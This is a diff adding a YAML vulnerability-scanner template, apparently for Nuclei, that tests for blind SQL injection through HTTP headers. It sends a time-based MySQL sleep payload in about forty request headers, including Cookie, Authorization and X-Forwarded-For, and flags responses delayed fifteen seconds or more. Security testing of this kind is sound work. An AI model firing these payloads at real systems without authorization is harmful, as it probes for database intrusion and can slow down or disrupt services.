@@ -1,0 +1,57 @@
+id: header-based-blind-sqli1
+
+info:
+  name: Header Blind SQL Injection
+  author: github.com/freelancermijan
+  severity: high
+  tags: sqli,bsqli,hsqli,bhsqli,dast
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    headers:
+      Accept: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      Accept-Charset: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      Accept-Datetime: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      Accept-Encoding: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      Accept-Language: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      Authorization: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      Cache-Control: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      Connection: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      Content-Length: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      Content-MD5: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      Content-Type: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      Cookie: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      Date: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      Expect: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      Forwarded: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      From: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      If-Match: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      If-Modified-Since: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      If-None-Match: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      If-Range: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      If-Unmodified-Since: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      Max-Forwards: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      Origin: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      Pragma: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      Proxy-Authorization: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      Range: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      Referer: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      TE: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      Upgrade: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      User-Agent: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      Via: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      Warning: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      X-Client-IP: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      X-Remote-IP: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      X-Remote-Addr: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      X-Forwarded-For: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      X-Originating-IP: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      X-Host: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+      X-Forwarded-Host: "0'XOR(if(now()=sysdate(),sleep(15),0))XOR'X"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration>=15"
